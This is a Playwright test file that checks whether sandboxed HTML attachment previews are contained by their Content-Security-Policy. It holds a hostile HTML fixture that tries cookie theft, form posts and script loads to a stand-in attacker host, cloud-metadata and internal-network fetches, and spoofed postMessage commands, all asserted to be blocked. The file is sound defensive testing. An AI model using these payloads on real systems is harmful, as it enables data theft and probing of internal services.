// SPDX-License-Identifier: AGPL-3.0-only
import { readFileSync } from 'node:fs'
import { test, expect, type Page } from '@playwright/test'
import { fixtures, mockWork } from './work-fixtures'
import { controlStability } from './control-stability'

// Exercise the exact shipped CSP in a real isolated browser. Go integration
// tests cover the capability handler, session recheck and tenant/project RLS.
const source = readFileSync(new URL('../../internal/attachments/sandbox.go', import.meta.url), 'utf8')
const policy = /sandboxCSP\s*=\s*"([^"]+)"/.exec(source)![1]
const previewURL = `https://preview.example.net/preview/${'A'.repeat(43)}`
const attackHTML = `<!doctype html><html><body>
<button id="local" onclick="this.textContent='Working';document.body.style.height='100000px';parent.postMessage({type:'resize',height:100000,command:'approve'},'*')">Interact</button>
<a id="download" download="attack.txt" href="data:text/plain,fixture">Download attack</a>
<form id="form" action="https://attacker.example.org/form" method="post"><input name="data" value="fixture"></form>
<img src="https://attacker.example.org/image"><svg><image href="https://attacker.example.org/svg"/></svg>
<iframe src="https://attacker.example.org/child"></iframe>
<style>@import 'https://attacker.example.org/style';body{background:url('http://169.254.169.254/latest/meta-data/')}</style>
<script src="https://attacker.example.org/script"></script>
<script>
const result={};
const blocked=(name,fn)=>{try{fn();result[name]=false}catch{result[name]=true}};
blocked('parent',()=>parent.document.body.dataset.compromised='yes');
blocked('cookie',()=>document.cookie);
blocked('storage',()=>localStorage.setItem('x','y'));
const workerBlocked=new Promise(resolve=>{try{const worker=new Worker('data:text/javascript,postMessage(1)');worker.onerror=()=>{result.worker=true;resolve(true)};worker.onmessage=()=>{result.worker=false;worker.terminate();resolve(false)}}catch{result.worker=true;resolve(true)}});
blocked('serviceWorker',()=>navigator.serviceWorker.register('/sw.js'));
if(parent!==self)blocked('top',()=>top.location.href='https://attacker.example.org/top');
result.popup=window.open('https://attacker.example.org/popup')===null;
document.querySelector('#form').submit();
parent.postMessage({type:'approve',id:'att-1',command:'fetch',url:'/api/me',height:100000},'*');
Promise.all([workerBlocked,...['https://app.example.com/api/me','http://127.0.0.1:55432/','http://10.0.0.1/','http://169.254.169.254/latest/meta-data/','https://attacker.example.org/connect'].map(async url=>{try{await fetch(url,{credentials:'include'});return false}catch{return true}})]).then(blocks=>{
result.connections=blocks.every(Boolean);document.body.dataset.result=JSON.stringify(result);document.body.dataset.ready='yes';
});
</script></body></html>`

async function setup(page: Page, options: { width?: number; dark?: boolean; available?: boolean; url?: string; body?: string; expiry?: number } = {}) {
  await page.setViewportSize({ width: options.width ?? 1440, height: 900 })
  await page.emulateMedia({ colorScheme: options.dark ? 'dark' : 'light' })
  const data = fixtures()
  Object.assign(data.attachments['n-1'][0], { name: 'fragment.html', content_type: 'text/html; charset=utf-8', width: null, height: null, caption: 'Interactive fragment', thumbnail_kind: 'html-text' })
  const calls = await mockWork(page, data)
  await page.route('**/api/attachments/att-1/preview', route => route.fulfill({ json: options.available === false ? { available: false } : { available: true, url: options.url ?? previewURL, expires_at: new Date(Date.now() + (options.expiry ?? 60_000)).toISOString() }, headers: { 'Cache-Control': 'no-store' } }))
  const attempts: string[] = []
  await page.context().route(/^https?:\/\/(attacker\.example\.org|app\.example\.com|127\.0\.0\.1:55432|10\.0\.0\.1|169\.254\.169\.254)\//, route => { attempts.push(route.request().url()); return route.fulfill({ body: 'fixture', contentType: 'text/plain' }) })
  await page.context().route(previewURL, route => route.fulfill({ body: options.body ?? attackHTML, contentType: 'text/html; charset=utf-8', headers: { 'Content-Security-Policy': policy, 'Referrer-Policy': 'no-referrer', 'Cache-Control': 'no-store, private', 'X-Content-Type-Options': 'nosniff', 'Permissions-Policy': 'camera=(), microphone=(), geolocation=()' } }))
  await page.goto('/p/PHAROS/PHAROS-11')
  await page.getByRole('button', { name: /^Open Interactive fragment/ }).first().click()
  const viewer = page.locator('dialog.lightbox')
  await expect(viewer).toBeVisible()
  return { viewer, calls, attempts }
}

test('P08: separate-origin preview enforces CSP in the viewer and a detached tab', async ({ page, context }) => {
  await context.addCookies([{ name: 'app-fixture', value: 'private', url: 'http://127.0.0.1' }])
  const { viewer, calls, attempts } = await setup(page)
  const iframe = viewer.locator('iframe.html-preview')
  await expect(iframe).toHaveAttribute('sandbox', 'allow-scripts')
  await expect(iframe).toHaveAttribute('referrerpolicy', 'no-referrer')
  const frame = page.frameLocator('iframe.html-preview')
  await expect(frame.locator('body')).toHaveAttribute('data-ready', 'yes')
  expect(JSON.parse(await frame.locator('body').getAttribute('data-result') ?? '{}')).toEqual({
    parent: true, cookie: true, storage: true, worker: true, serviceWorker: true, top: true, popup: true, connections: true,
  })
  expect(attempts).toEqual([])
  expect(await page.locator('body').getAttribute('data-compromised')).toBeNull()
  const close = viewer.getByRole('button', { name: 'Close viewer' })
  const guard = await controlStability(page, { close, download: viewer.getByRole('link', { name: 'Download fragment.html' }) })
  await guard.check(async () => {
    await frame.getByRole('button', { name: 'Interact' }).click()
    await expect(frame.getByRole('button', { name: 'Working' })).toBeVisible()
  })
  guard.done()
  const downloads: string[] = []
  page.on('download', download => downloads.push(download.suggestedFilename()))
  await frame.getByRole('link', { name: 'Download attack' }).click()
  await expect(frame.locator('body')).toHaveAttribute('data-ready', 'yes')
  expect(downloads).toEqual([])
  expect(calls.filter(call => call.method !== 'GET' && call.path !== '/api/preferences/releases')).toEqual([])

  const link = viewer.getByRole('link', { name: 'Open preview in new tab' })
  await expect(link).toHaveAttribute('rel', 'noopener noreferrer')
  const opened = context.waitForEvent('page')
  await link.click()
  const tab = await opened
  await expect(tab.locator('body')).toHaveAttribute('data-ready', 'yes')
  const result = JSON.parse(await tab.locator('body').getAttribute('data-result') ?? '{}')
  expect(result).toMatchObject({ cookie: true, storage: true, worker: true, serviceWorker: true, popup: true, connections: true })
  expect(await tab.evaluate(() => window.opener === null)).toBe(true)
  expect(attempts).toEqual([])
  // A direct tab can navigate itself. Preserve the explicit residual and the
  // no-referrer assertion rather than promising that CSP prevents navigation.
  let referrer: string | undefined
  await tab.route('https://attacker.example.org/residual?data=synthetic', route => {
    referrer = route.request().headers().referer
    return route.fulfill({ body: 'Residual navigation observed', contentType: 'text/plain' })
  })
  await tab.evaluate(() => { location.href = 'https://attacker.example.org/residual?data=synthetic' })
  await expect(tab).toHaveURL('https://attacker.example.org/residual?data=synthetic')
  expect(referrer).toBeUndefined()
  await tab.close()
  await close.click()
  await expect(iframe).toHaveCount(0)
})

test('P08: unavailable, expired and departed previews keep download and discard late grants', async ({ page }) => {
  const now = Date.now()
  await page.clock.install({ time: now })
  const { viewer } = await setup(page, { width: 390, available: false, body: '<html><button onclick="document.body.style.height=\'100000px\';parent.postMessage({height:100000},\'*\');this.textContent=\'Expanded\'">Local</button></html>' })
  const fallback = async (message: RegExp) => {
    await expect(viewer.locator('iframe')).toHaveCount(0)
    await expect(viewer.getByRole('status')).toContainText(message)
    await expect(viewer.getByRole('link', { name: 'Download', exact: true })).toHaveAttribute('href', '/api/attachments/att-1/content?variant=original')
  }
  await fallback(/original can still be downloaded/)
  let url = `https://127.0.0.1/preview/${'A'.repeat(43)}`
  await page.route('**/api/attachments/att-1/preview', route => route.fulfill({ json: { available: true, url, expires_at: new Date(now + 60_000).toISOString() } }))
  await viewer.getByRole('button', { name: 'Reload preview' }).click()
  await fallback(/unavailable/)
  url = previewURL
  await viewer.getByRole('button', { name: 'Reload preview' }).click()
  await expect(viewer.locator('iframe')).toHaveCount(1)
  const frame = page.frameLocator('iframe.html-preview')
  await expect(frame.getByRole('button', { name: 'Local', exact: true })).toBeVisible()
  const guard = await controlStability(page, { frame: viewer, close: viewer.getByRole('button', { name: 'Close viewer' }), download: viewer.getByRole('link', { name: 'Download fragment.html' }) })
  await guard.check(async () => {
    await frame.getByRole('button', { name: 'Local', exact: true }).click()
    await expect(frame.getByRole('button', { name: 'Expanded' })).toBeVisible()
  })
  guard.done()
  await page.clock.fastForward(60_001)
  await fallback(/expired/)

  // Hold a fully received response while its JSON is delivered. Aborting the
  // network cannot hide a missing selection-generation check in this race.
  await page.evaluate(() => {
    type Hold = Window & { previewParsed: boolean; previewReturned: boolean; releasePreview: () => void }
    const state = window as Hold, fetch = window.fetch
    let held = false
    state.previewParsed = false; state.previewReturned = false
    window.fetch = async (...args) => {
      const response = await fetch(...args)
      if (new URL(response.url).pathname === '/api/attachments/att-1/preview' && !held) {
        held = true
        const json = response.json.bind(response)
        response.json = async () => {
          const value = await json()
          const gate = new Promise<void>(resolve => { state.releasePreview = resolve })
          state.previewParsed = true
          await gate
          state.previewReturned = true
          return value
        }
      }
      return response
    }
  })
  let releaseFresh!: () => void, enteredFresh!: () => void, requests = 0
  const freshHeld = new Promise<void>(resolve => { releaseFresh = resolve })
  const freshStarted = new Promise<void>(resolve => { enteredFresh = resolve })
  await page.route('**/api/attachments/att-1/preview', async route => {
    if (++requests === 1) return route.fulfill({ json: { available: true, url: previewURL, expires_at: new Date(now + 120_000).toISOString() } })
    enteredFresh(); await freshHeld
    await route.fulfill({ json: { available: false } })
  })
  await viewer.getByRole('button', { name: 'Reload preview' }).click()
  await expect.poll(() => page.evaluate(() => (window as Window & { previewParsed: boolean }).previewParsed)).toBe(true)
  await viewer.getByRole('button', { name: 'Next attachment' }).click()
  await expect(viewer.getByRole('heading', { name: 'After: compact list' })).toBeVisible()
  await viewer.getByRole('button', { name: 'Previous attachment' }).click()
  await freshStarted
  await page.evaluate(async () => {
    const state = window as Window & { releasePreview: () => void }
    state.releasePreview()
    await new Promise<void>(resolve => requestAnimationFrame(() => resolve()))
  })
  await expect.poll(() => page.evaluate(() => (window as Window & { previewReturned: boolean }).previewReturned)).toBe(true)
  await expect(viewer.getByRole('status')).toContainText('Opening HTML preview')
  await expect(viewer.locator('iframe')).toHaveCount(0)
  releaseFresh()
  await fallback(/unavailable/)
})
